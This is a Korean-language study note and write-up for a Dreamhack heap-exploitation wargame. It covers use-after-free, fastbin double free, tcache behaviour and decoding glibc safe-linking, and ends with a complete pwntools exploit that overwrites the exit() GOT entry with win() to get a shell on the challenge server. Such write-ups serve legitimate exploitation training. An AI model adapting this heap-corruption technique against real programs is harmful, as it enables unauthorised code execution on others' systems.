---
quickshare-date: 2024-08-11 00:06:00
quickshare-url: "https://noteshare.space/note/clzo9qb8i1968301mwtxgwoww1#+1TMybtdY+YjMZCypwTJsYBMf6QhquhYGDGka5JkzI0"
---
# UAF, DFB, fastbin dup into stack

알아간 것 : 0x20짜리 청크는 되는데 왜 0x30짜리는 안 되는걸까
0x30짜리 청크는 tcache에서 재할당을 해서 fastbin 관련 공격이 안 되는 것이었다.
edit이 되므로 tcache positioning으로 똑같이 풀 수 있을 것 같다.
근데 gdb는 적당히 작은 모든 청크는 재할당을 안 하던데...

heap base라는 것을 처음 알았다.
heap safe linking을 듣기만 했어서 (>> 12) 연산을 한 번만 하면 되는 줄 알았는데 그런 게 아니었고,
결국 공식 답을 보고서 깨달았다.

```python
def decrypt_safe_link(addr): # by Dreamhack's writeup
    key = (addr & 0x0000fff000000000) >> (4 * 3)
    decrypted = addr ^ key
    key = (decrypted & 0x0000000fff000000) >> (4 * 3)
    decrypted = decrypted ^ key
    key = (decrypted & 0x0000000000fff000) >> (4 * 3)
    decrypted = decrypted ^ key
    return decrypted
```

어이가 없었지만.. 이걸로 배웠다면 충분하다.

win 함수가 있는 줄 몰랐다. fake chunk를 스택에 만들어서 ROP까지 해야하는 게 5렙인가 생각했었는데 헛고생할뻔했다. 빨리 공식 답을 보길 잘했다.

tcache 청크는 fd에 data의 주소를 넣고, fastbin 청크는 fd에 청크 시작 주소를 넣는다. 그래서 0x10만큼 차이가 난다.

예전에 tcache positioning이 너무 어려워서 이해를 포기하고 넘겼었는데, 이번에 문제를 보자마자 구조가 떠오르면서 한 번에 이해가 됐다.(그렇지만 아직 헷갈리더라)
그래도 익스 코드보면 바로 이해할테니, 코드에 대한 설명은 생략하겠다.

```python
from pwn import *

p = remote('host3.dreamhack.games', 10988)
e = ELF('./note')

def create(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', idx)
    p.sendlineafter(b'size: ', size)
    p.sendafter(b'data: ', data)

def rd(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', idx)

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', idx)
    p.sendafter(b'data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx: ', idx)

def decrypt_safe_link(addr):
    key = (addr & 0x0000fff000000000) >> (4 * 3)
    decrypted = addr ^ key
    key = (decrypted & 0x0000000fff000000) >> (4 * 3)
    decrypted = decrypted ^ key
    key = (decrypted & 0x0000000000fff000) >> (4 * 3)
    decrypted = decrypted ^ key
    return decrypted

create(b'5', b'48', b'csh')

for _ in range(7):
    create(b'9', b'48', b'a')
    delete(b'9')

for i in range(2):
    create(str(i).encode(), b'32', b'csh')

delete(b'0')
delete(b'1')
delete(b'0')

rd(b'9')
leak = u64(p.recvline().split()[1].ljust(8, b'\x00'))
print('leak..', hex(leak))

decrypted_leak = decrypt_safe_link(leak)
print('decrypted_leak..', hex(decrypted_leak))

fake_chunk_addr = 0x4040f0

create(b'0', b'32', p64(fake_chunk_addr ^ ((decrypted_leak >> 12))))  # A
# status of fastbin: B -> A -> B -> ..
# *A = fake_chunk_addr
# status of fastbin: B -> A -> fake_chunk_addr -> ..

create(b'0', b'32', b'b')  # B
# status of fastbin: A -> fake_chunk_addr -> ..

create(b'0', b'32', b'a')  # A
# status of fastbin: fake_chunk_addr -> ..

# overwrite a string pointer with the got entry of exit()
create(b'0', b'32', p64(e.got['exit']))  # malicious chunk *_*

# overwrite the got entry of exit() with win()
edit(b'5', p64(0x0000000000401256))  # win()

# get shell by calling exit()
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'idx: ', b'-1')

p.interactive()
```